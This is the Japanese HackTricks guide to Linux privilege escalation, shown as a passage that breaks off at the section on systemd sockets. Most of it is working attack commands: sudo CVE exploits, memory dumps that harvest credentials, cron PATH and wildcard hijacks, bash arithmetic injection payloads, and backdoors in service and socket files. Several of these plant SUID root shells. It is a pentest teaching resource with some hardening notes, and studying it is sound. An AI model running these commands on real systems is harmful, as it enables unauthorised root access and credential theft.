# Linux 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

まず、実行中のOSについて少し知識を得ることから始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH` 変数内の任意のフォルダに対して**書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に、興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、権限昇格に使える exploit がないか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱な kernel の一覧と、すでに**compiled exploits**されたものはここで見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
**compiled exploits**を見つけられる他のサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

その web からすべての脆弱な kernel version を抽出するには、次のようにできます:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploit を探すのに役立つツールは以下です:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 内で実行する, kernel 2.x の exploit だけを確認)

必ず **kernel version を Google で検索** してください。自分の kernel version がどこかの kernel exploit に書かれているかもしれず、その場合その exploit が有効だと確認できます。

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に見られる脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
`grep` を使って sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 より前の Sudo バージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、`/etc/nsswitch.conf` ファイルがユーザー制御のディレクトリから使用される場合、sudo `--chroot` オプションを介して権限のないローカルユーザーが root に権限昇格できます。

これはその [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) で、この [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を悪用します。エクスプロイトを実行する前に、`sudo` のバージョンが脆弱であり、`chroot` 機能をサポートしていることを確認してください。

詳細は、元の [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 より前の Sudo（影響範囲として報告: **1.8.8–1.9.17**）は、`sudo -h <host>` の **user-supplied hostname** を **real hostname** の代わりに使って host-based sudoers rules を評価できます。sudoers が別の host に対してより広い権限を付与している場合、その host をローカルで **spoof** できます。

要件:
- 脆弱な sudo version
- host-specific sudoers rules（host が現在の hostname でも `ALL` でもないこと）

sudoers パターンの例:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
許可された host を spoofing して exploit する:
```bash
sudo -h devbox id
sudo -h devbox -i
```
偽装した名前の解決がブロックされる場合は、`/etc/hosts` に追加するか、DNS lookup を避けるためにすでに logs/configs に現れている hostname を使ってください。

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

この脆弱性がどのように悪用されうるかの**例**は、HTBの**smasher2 box**を確認してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## コンテナ脱出

コンテナ内にいる場合は、まず次の container-security セクションから始め、その後 runtime-specific abuse のページへ移ってください:


{{#ref}}
container-security/
{{#endref}}

## ドライブ

**何がマウントされていて何がアンマウントされているか**、どこにあり、なぜかを確認します。何かがアンマウントされているなら、マウントを試して private info を確認できるかもしれません
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

便利なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、カーネル exploit を使う必要がある場合に役立ちます。というのも、それを使用するマシン上（またはそれに近い環境）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストール済みパッケージとサービスのバージョン** を確認してください。古い Nagios のバージョン（たとえば）があり、権限昇格に悪用できるかもしれません…\
特に怪しいインストール済みソフトウェアについては、手動でバージョンを確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
SSHアクセスがあるなら、**openVAS** を使って、マシン内にインストールされている古い、脆弱なソフトウェアを確認することもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示しますが、その大部分は役に立たないため、OpenVAS などの、インストール済みソフトウェアのバージョンが既知の exploit に対して脆弱かどうかを確認してくれるアプリケーションを使うことが推奨されます_

## Processes

**どのプロセス**が実行されているかを確認し、**本来よりも多くの権限**を持つプロセスがないかチェックしてください（たとえば、root で実行されている tomcat など）。
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** は、プロセスのコマンドライン内の `--inspect` パラメータを確認して、それらを検出する。\
また、プロセスのバイナリに対する権限も**確認**しよう。もしかすると誰かのものを書き換えられるかもしれない。

### Cross-user parent-child chains

親とは**異なるユーザー**で実行されている子プロセスは、必ずしも悪意があるわけではないが、有用な**triage signal**である。いくつかの遷移は想定内だが（`root` が service user を起動する、login managers が session processes を作成するなど）、不自然なチェーンは wrapper、debug helpers、persistence、または脆弱な runtime trust boundaries を示している可能性がある。

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
驚くべき chain を見つけたら、親コマンドラインと、その挙動に影響するすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な引数）を調べてください。実際の privesc の複数の経路では、子プロセス自体は書き込み可能ではありませんでしたが、**親が制御する config** や helper chain は書き込み可能でした。

### 削除された executables と deleted-open files

runtime artifacts は、**削除後**でもアクセス可能なことがよくあります。これは privilege escalation と、すでに sensitive files を open している process から evidence を回収することの両方に有用です。

削除された executables を確認します:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
If `/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはまだメモリ上の古いバイナリイメージを実行しています。これは調査すべき強いシグナルです。理由は次のとおりです。

- 削除された実行ファイルに、興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、まだ有用なファイルディスクリプタを公開している可能性がある
- 削除された特権バイナリは、最近の改ざんや痕跡消去の試みを示している可能性がある

削除済みで開かれているファイルを全体的に収集する:
```bash
lsof +L1
```
興味深い descriptor を見つけたら、直接 recover してください:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
これは、プロセスが削除済みの secret、script、database export、または flag file をまだ開いているときに特に有用です。

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使ってプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されていることや、特定の条件が満たされたときに実行されることを見つけるのに非常に役立ちます。

### Process memory

サーバーの一部のサービスは、**credentials をメモリ内に平文で保存**します。\
通常、他のユーザーに属するプロセスのメモリを読むには **root privileges** が必要です。そのため、これは通常、すでに root であり、さらに多くの credentials を見つけたいときにより有用です。\
ただし、**通常のユーザーとしては、自分が所有するプロセスのメモリは読める**ことを覚えておいてください。

> [!WARNING]
> 現在では多くのマシンがデフォルトで **ptrace を許可しない** ため、権限のないユーザーに属する他のプロセスをダンプできません。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルは ptrace のアクセス可能性を制御します:
>
> - **kernel.yama.ptrace_scope = 0**: すべてのプロセスは、同じ uid を持つ限りデバッグできます。これは ptrace が動作していた従来の方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability が必要なため、admin のみ ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptracing を再度有効にするには再起動が必要です。

#### GDB

たとえば FTP service のメモリにアクセスできるなら、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定の process ID に対して、**maps はその process の仮想アドレス空間内で memory がどのようにマッピングされているか**を示します。また、各マッピング領域の**権限**も示します。**mem** pseudo file は**process の memory 自体**を公開します。**maps** file から、どの**memory region が readable** であるかと、その offset がわかります。この情報を使って、**mem file 内を seek し、readable な全ての region を file に dump** します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### linux用のProcDump

ProcDumpは、Windows向けのSysinternalsツール群にある古典的なProcDumpツールをLinux向けに再構成したものです。入手先は[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

プロセスメモリをダンプするには、以下を使えます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root要件を手動で削除して、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### Credentials from Process Memory

#### Manual example

authenticator プロセスが実行中だと分かったら:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法については前のセクションを参照）、メモリ内に認証情報がないか検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み**、一部の**よく知られたファイル**からも取得します。正しく動作させるには root 権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | ---------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon   |
| LightDM (Ubuntu Desktop)                          | lightdm                |
| VSFTPd (Active FTP Connections)                   | vsftpd                 |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2                |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                  |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

もし web の “Crontab UI” パネル (alseambusher/crontab-ui) が root で動作しており、loopback にのみ bind されている場合でも、SSH の local port-forwarding を使って到達でき、権限昇格のために privileged job を作成できます。

Typical chain
- `ss -ntlp` / `curl -v localhost:8000` で loopback-only port（例: 127.0.0.1:8000）と Basic-Auth realm を発見する
- 運用 artifacts 内で credentials を見つける:
- `zip -P <password>` を使った backups/scripts
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限の job を作成してすぐに実行する（SUID shell を落とす）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- それを使う:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI を root で実行しない; 専用ユーザーと最小権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードは再利用しない
- unit files に secrets を埋め込まない; secret stores か root-only の EnvironmentFile を使う
- 必要時の job 実行に対して audit/logging を有効にする



スケジュールされた job に脆弱性がないか確認する。root によって実行される script を悪用できるかもしれない（wildcard vuln? root が使う files を変更できるか? symlinks を使えるか? root が使う directory に特定の files を作成できるか?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` が使用されている場合、実際に実行される名前を確認してください:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
これは false positives を避けます。書き込み可能な periodic directory は、payload のファイル名がローカルの `run-parts` ルールに一致する場合にのみ有用です。

### Cron path

例えば、_/etc/crontab_ の中では PATH を見つけられます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user というユーザーが /home/user に対する書き込み権限を持っていることに注意_)

この crontab の中で root ユーザーが path を設定せずに何らかの command や script を実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\
すると、次の方法で root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを使ったスクリプトによる Cron（Wildcard Injection）

root によって実行されるスクリプトのコマンド内に “**\***” がある場合、これを悪用して予期しないこと（privesc など）を起こせる可能性があります。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は、`((...))`、`$((...))`、および `let` における arithmetic evaluation の前に、parameter expansion と command substitution を実行します。root の cron/parser が信頼できない log フィールドを読み取り、それらを arithmetic context に渡す場合、攻撃者は command substitution `$(...)` を注入して、cron 実行時に root として実行させることができます。

- Why it works: Bash では、展開は次の順序で行われます: parameter/variable expansion、command substitution、arithmetic expansion、その後に word splitting と pathname expansion。つまり、`$(/bin/bash -c 'id > /tmp/pwn')0` のような値は、まず置換されて command が実行され、その後に残った数値の `0` が arithmetic に使われるため、スクリプトはエラーなく継続します。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 攻撃者が制御するテキストを解析対象の log に書き込ませ、数値に見えるフィールドに command substitution を含めて末尾が数字で終わるようにします。command が stdout に出力しないようにするか、リダイレクトして、arithmetic が有効なままになるようにします。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行されるスクリプトが **あなたが完全にアクセスできるディレクトリ** を使っているなら、そのフォルダを削除して、**あなたが制御するスクリプトを提供する別の場所への symlink フォルダを作成する** と有用かもしれません
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation and safer file handling

権限のあるスクリプト/バイナリがパスでファイルを読み書きする場合は、リンクの扱いを確認してください:

- `stat()` は symlink をたどって、対象のメタデータを返します。
- `lstat()` は link 自体のメタデータを返します。
- `readlink -f` と `namei -l` は最終的な対象の解決を助け、各パス構成要素の権限を表示します。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: path がすでに存在する場合は失敗させる（攻撃者が事前に作成した links/files をブロック）。
- `openat()`: 信頼できる directory file descriptor を基準に相対的に操作する。
- `mkstemp()`: 安全な permissions で temporary files を原子的に作成する。

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. `pspy` を使って verification flow を取得する。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を行ってから file を実行していた。
2. 漏えいした key/config（`signing.zip` から）を使って期待される certificate を再作成する:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. malicious な replacement を作成し（例: SUID bash を置く、SSH key を追加する）、certificate を `.text_sig` に埋め込んで grep を通す:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行権限を維持したまま scheduled binary を上書きする:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待つ；単純な signature check が通れば、payload は root で実行される。

### Frequent cron jobs

プロセスを監視して、1, 2, 5 分ごとに実行されている process を探すことができる。うまく利用できれば、権限昇格につなげられるかもしれない。

たとえば、**1 分間 0.1s ごとに監視**し、**実行回数が少ない順に sort** して、最も多く実行された commands を削除するには、次のようにできる:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは開始されるすべてのプロセスを監視して一覧表示します)。

### attacker-set mode bits を保持する Root バックアップ (pg_basebackup)

root-owned の cron が、書き込み可能な database directory に対して `pg_basebackup`（または任意の recursive copy）をラップしている場合、**SUID/SGID binary** を仕込むことで、同じ mode bits のまま **root:root** として backup output に再コピーさせることができます。

典型的な discovery flow（低権限の DB user として）:
- `pspy` を使って、root cron が `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを毎分呼び出しているのを見つける。
- source cluster（例: `/var/lib/postgresql/14/main`）が自分にとって writable であり、destination (`/opt/backups/current`) が job 後に root 所有になることを確認する。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは、`pg_basebackup` がクラスターをコピーする際に file mode bits を保持するために動作します。root によって実行されると、宛先のファイルは **root ownership + attacker-chosen SUID/SGID** を継承します。permissions を保持し、実行可能な場所に書き込む同様の privileged backup/copy routine はすべて vulnerable です。

### Invisible cron jobs

コメントの後に carriage return を入れる（newline character なし）ことで cronjob を作成でき、それは動作します。例（carriage return char に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
この種の stealth entry を検出するには、制御文字を表示できるツールで cron ファイルを確認します:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Any `.service` file を書き込めるか確認してください。書き込める場合、そのファイルを**改変**して、サービスが**開始**、**再起動**、または**停止**されたときに**backdoor**を**実行**させることが**できる**かもしれません（マシンが再起動されるまで待つ必要があるかもしれません）。\
例えば、`.service` ファイル内で **`ExecStart=/tmp/script.sh`** を使って backdoor を作成できます。

### Writable service binaries

サービスによって実行される binary に対して**write permissions**がある場合、それらを backdoor 用に変更できます。そうすれば、サービスが再実行されたときに backdoor も実行されます。

### systemd PATH - Relative Paths

**systemd** が使う PATH は次のように確認できます:
```bash
systemctl show-environment
```
パスの任意のフォルダに**書き込み**できることが分かった場合、**権限昇格**できる可能性があります。**サービス設定**ファイルで使用されている**相対パス**を次のように探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, systemd PATHフォルダ内で書き込み可能な場所に、相対パスのbinaryと**同じ名前**の**実行可能ファイル**を作成すると、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）の実行を要求されたときに、あなたの**backdoor**が実行されます（通常、権限のないユーザーはサービスの start/stop はできませんが、`sudo -l` を使えるか確認してください）。

**サービスについて詳しくは `man systemd.service` を参照してください。**

## **Timers**

**Timers** は、名前が `**.timer**` で終わる systemd unit file で、 `**.service**` file や event を制御します。**Timers** は cron の代替として使え、calendar time events と monotonic time events の両方を built-in でサポートし、非同期に実行できます。

すべての timers は次のように列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能な timers

timer を変更できるなら、systemd.unit の既存のもの（`.service` や `.target` など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unit とは何かを読むことができます:

> この timer が期限切れになったときに activate する unit。引数は unit 名であり、その suffix は ".timer" ではありません。指定しない場合、この値は timer unit と同じ名前の service を default とします。ただし suffix は除きます。(上記参照。) activate される unit 名と timer unit の unit 名は、suffix を除いて同一にすることが推奨されます。

したがって、この権限を abuse するには、次が必要になります:

- 書き込み可能な binary を **実行している** systemd unit（`.service` など）を見つける
- **相対パス** を **実行している** systemd unit を見つけ、さらに **systemd PATH** に対して **writable privileges** を持っていること（その executable を impersonate するため）

**timer については `man systemd.timer` で詳しく学べます。**

### **Timer の有効化**

timer を enable するには root privileges が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) は、client-server models 内で同じマシンまたは異なるマシン間の**process communication**を可能にします。これらは、コンピュータ間通信のために標準の Unix descriptor files を利用し、`.socket` files を通じて設定されます。

Sockets は `.socket` files を使って設定できます。

**`man systemd.socket` で sockets についてさらに学べます。** このファイル内では、いくつかの興味深い parameters を設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらの options はそれぞれ異なりますが、要するに socket が**どこで listen するか**を示します（AF_UNIX socket file の path、listen する IPv4/6 および/または port number など）。
- `Accept`: boolean argument を取ります。**true** の場合、**各 incoming connection ごとに service instance が spawn** され、connection socket だけが渡されます。**false** の場合、すべての listening sockets 自体が **起動された service unit に渡され**、すべての connections で 1 つの service unit だけが spawn されます。この値は、単一の service unit がすべての incoming traffic を無条件に処理する datagram sockets と FIFOs では無視されます。**デフォルトは false** です。performance の観点からは、新しい daemons は `Accept=no` に適した形でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 つ以上の command lines を取ります。これらは、それぞれ listening **sockets**/FIFOs が **作成** され bind される **前** または **後** に実行されます。command line の最初の token は absolute filename でなければならず、その後に process の arguments が続きます。
- `ExecStopPre`, `ExecStopPost`: 追加の **commands** で、それぞれ listening **sockets**/FIFOs が **閉じられ** て削除される **前** または **後** に実行されます。
- `Service`: **incoming traffic** に対して **activate** する **service** unit 名を指定します。この設定は `Accept=no` の sockets に対してのみ許可されます。デフォルトは、socket と同じ名前を持つ service（suffix が置き換えられたもの）です。ほとんどの場合、この option を使う必要はありません。

### Writable .socket files

もし **writable** な `.socket` file を見つけたら、`[Socket]` section の先頭に `ExecStartPre=/home/kali/sys/backdoor` のようなものを **追加** できます。そうすると backdoor は socket が作成される前に実行されます。したがって、**おそらく machine が reboot されるまで待つ必要があります。**\
_system はその socket file configuration を使っていなければならず、そうでなければ backdoor は実行されません_

### Socket activation + writable unit path (create missing service)

もう 1 つの高影響な misconfiguration は次のとおりです:

- `Accept=no` かつ `Service=<name>.service` の socket unit
- 参照される service unit が存在しない
- attacker が `/etc/systemd/system`（または別の unit search path）に書き込める

この場合、attacker は `<name>.service` を作成し、その後 socket に traffic を送ることで systemd に新しい service を読み込ませ、root として実行させることができます。

Quick flow:
```bash
systemctl cat vuln.socket
